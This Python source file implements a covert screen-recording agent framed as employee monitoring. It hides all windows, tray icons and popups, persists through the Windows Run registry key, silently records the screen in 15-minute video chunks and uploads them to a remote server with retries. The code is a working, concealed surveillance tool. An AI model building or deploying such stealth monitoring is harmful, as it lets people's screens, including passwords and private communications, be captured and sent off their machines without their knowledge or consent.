import os
import sys
import time
import json
import socket
import platform
import threading
from datetime import datetime
import urllib.request
import urllib.error

# Windows Registry module
if sys.platform == 'win32':
    import winreg

# Ensure dependencies are available
import requests
import cv2
import numpy as np
import mss

# Application Data Directory for Silent Agent
if sys.platform == 'win32':
    APP_DIR = os.path.join(os.environ.get('APPDATA', os.path.expanduser('~')), 'UltraMonitor')
else:
    APP_DIR = os.path.join(os.path.expanduser('~'), '.ultramonitor')

os.makedirs(APP_DIR, exist_ok=True)
CONFIG_FILE = os.path.join(APP_DIR, 'config.json')

DEFAULT_CONFIG = {
    "server_url": "http://127.0.0.1:8000",
    "employee_code": "EMP001",
    "employee_name": "Employee 1",
    "fps": 2,
    "chunk_duration_minutes": 15, # 15-minute segments
    "target_width": 1280,
    "target_height": 720
}

def ensure_windows_startup():
    """Ensure agent automatically runs every time Windows boots up (HKCU Run Key)."""
    if sys.platform != 'win32':
        return
    try:
        exe_path = os.path.abspath(sys.argv[0])
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "UltraMonitorAgent", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except Exception:
        pass


def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                user_cfg = json.load(f)
                cfg = DEFAULT_CONFIG.copy()
                cfg.update(user_cfg)
                return cfg
        except Exception:
            pass
    
    # Also check current executable directory for fallback config.json
    local_cfg = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), 'config.json')
    if os.path.exists(local_cfg):
        try:
            with open(local_cfg, 'r') as f:
                user_cfg = json.load(f)
                cfg = DEFAULT_CONFIG.copy()
                cfg.update(user_cfg)
                # Save to APP_DIR
                with open(CONFIG_FILE, 'w') as out_f:
                    json.dump(cfg, out_f, indent=4)
                return cfg
        except Exception:
            pass

    return DEFAULT_CONFIG


class SilentEmployeeMonitorAgent:
    """
    Completely Silent Background Screen Recorder Agent.
    NO Windows, NO Taskbar Icon, NO Tray Icon, NO Popups.
    """
    def __init__(self):
        self.config = load_config()
        self.hostname = socket.gethostname()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.temp_dir = os.path.join(APP_DIR, 'temp_chunks')
        os.makedirs(self.temp_dir, exist_ok=True)
        self.is_running = True
        self.upload_queue = []
        self.queue_lock = threading.Lock()
        self._scan_existing_temp_files()

    def _scan_existing_temp_files(self):
        """Queue any leftover video chunks found from previous runs or crashes."""
        if not os.path.exists(self.temp_dir):
            return
        for fname in os.listdir(self.temp_dir):
            if fname.endswith(('.webm', '.avi')):
                fpath = os.path.join(self.temp_dir, fname)
                try:
                    if os.path.getsize(fpath) > 1024:
                        mtime = os.path.getmtime(fpath)
                        iso_time = datetime.fromtimestamp(mtime).isoformat()
                        self.queue_upload(fpath, iso_time, int(self.config.get('chunk_duration_minutes', 15) * 60))
                except Exception:
                    pass

    def register_device(self):
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/register/"
        payload = {
            "employee_code": self.config['employee_code'],
            "employee_name": self.config.get('employee_name', self.config['employee_code']),
            "employee_email": f"{self.config['employee_code']}@company.local",
            "hostname": self.hostname,
            "os_info": self.os_info
        }
        try:
            requests.post(endpoint, json=payload, timeout=10)
        except Exception:
            pass

    def heartbeat_thread(self):
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/ping/"
        payload = {"employee_code": self.config['employee_code'], "hostname": self.hostname}
        while self.is_running:
            try:
                requests.post(endpoint, json=payload, timeout=5)
            except Exception:
                pass
            time.sleep(60)

    def queue_upload(self, file_path, recorded_at_iso, duration_seconds):
        """Adds a completed video chunk to the upload retry queue."""
        with self.queue_lock:
            for item in self.upload_queue:
                if item['file_path'] == file_path:
                    return
            self.upload_queue.append({
                'file_path': file_path,
                'recorded_at': recorded_at_iso,
                'duration_seconds': duration_seconds,
                'attempts': 0
            })

    def upload_chunk_async(self, file_path, recorded_at_iso, duration_seconds):
        """Alias for queue_upload."""
        self.queue_upload(file_path, recorded_at_iso, duration_seconds)

    def _attempt_upload(self, item):
        file_path = item['file_path']
        recorded_at_iso = item['recorded_at']
        duration_seconds = item['duration_seconds']
        server_url = self.config['server_url'].rstrip('/')
        endpoint = f"{server_url}/api/agent/upload/"

        try:
            with open(file_path, 'rb') as f:
                files = {'video_chunk': (os.path.basename(file_path), f, 'video/webm')}
                data = {
                    'employee_code': self.config['employee_code'],
                    'recorded_at': recorded_at_iso,
                    'duration_seconds': duration_seconds
                }
                res = requests.post(endpoint, data=data, files=files, timeout=90)
                return res.status_code == 200
        except Exception:
            return False

    def _upload_worker(self):
        """Background thread worker that processes the upload queue with retry."""
        while self.is_running:
            item = None
            with self.queue_lock:
                if self.upload_queue:
                    item = self.upload_queue[0]

            if not item:
                time.sleep(3)
                continue

            file_path = item['file_path']
            if not os.path.exists(file_path):
                with self.queue_lock:
                    if item in self.upload_queue:
                        self.upload_queue.remove(item)
                continue

            success = self._attempt_upload(item)
            if success:
                with self.queue_lock:
                    if item in self.upload_queue:
                        self.upload_queue.remove(item)
                try:
                    os.remove(file_path)
                except OSError:
                    pass
                time.sleep(1)
            else:
                item['attempts'] += 1
                time.sleep(10)

    def run(self):
        ensure_windows_startup()
        self.register_device()

        # Start heartbeat in background daemon thread
        threading.Thread(target=self.heartbeat_thread, daemon=True).start()

        # Start upload worker thread with retry queue
        threading.Thread(target=self._upload_worker, daemon=True).start()

        fps = max(1, min(5, int(self.config.get('fps', 2))))
        chunk_seconds = int(self.config.get('chunk_duration_minutes', 15) * 60)
        width = int(self.config.get('target_width', 1280))
        height = int(self.config.get('target_height', 720))

        while self.is_running:
            try:
                with mss.mss() as sct:
                    if not sct.monitors or len(sct.monitors) < 2:
                        time.sleep(3)
                        continue
                    monitor = sct.monitors[1]

                    timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
                    recorded_at_iso = datetime.now().isoformat()
                    output_filename = f"silent_{self.config['employee_code']}_{timestamp_str}.webm"
                    output_filepath = os.path.join(self.temp_dir, output_filename)

                    fourcc = cv2.VideoWriter_fourcc(*'VP80')
                    out = cv2.VideoWriter(output_filepath, fourcc, fps, (width, height))

                    if not out.isOpened():
                        fourcc = cv2.VideoWriter_fourcc(*'XVID')
                        output_filename = output_filename.replace('.webm', '.avi')
                        output_filepath = os.path.join(self.temp_dir, output_filename)
                        out = cv2.VideoWriter(output_filepath, fourcc, fps, (width, height))

                    start_time = time.time()
                    frame_interval = 1.0 / fps
                    frames_captured = 0

                    try:
                        while (time.time() - start_time) < chunk_seconds and self.is_running:
                            loop_start = time.time()

                            try:
                                sct_img = sct.grab(monitor)
                                frame = np.array(sct_img)
                                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                                frame_resized = cv2.resize(frame, (width, height))

                                out.write(frame_resized)
                                frames_captured += 1
                            except Exception:
                                # Display may be asleep or locked; pause briefly without crashing
                                time.sleep(2)
                                continue

                            elapsed = time.time() - loop_start
                            sleep_time = max(0.001, frame_interval - elapsed)
                            time.sleep(sleep_time)

                    except Exception:
                        pass
                    finally:
                        out.release()

                    actual_duration = int(time.time() - start_time)
                    if frames_captured > 0 and os.path.exists(output_filepath):
                        self.queue_upload(output_filepath, recorded_at_iso, actual_duration)
                    elif os.path.exists(output_filepath):
                        try:
                            os.remove(output_filepath)
                        except OSError:
                            pass

            except Exception:
                # Screen lock or power state transition; wait and retry cleanly
                time.sleep(5)

if __name__ == '__main__':
    agent = SilentEmployeeMonitorAgent()
    agent.run()
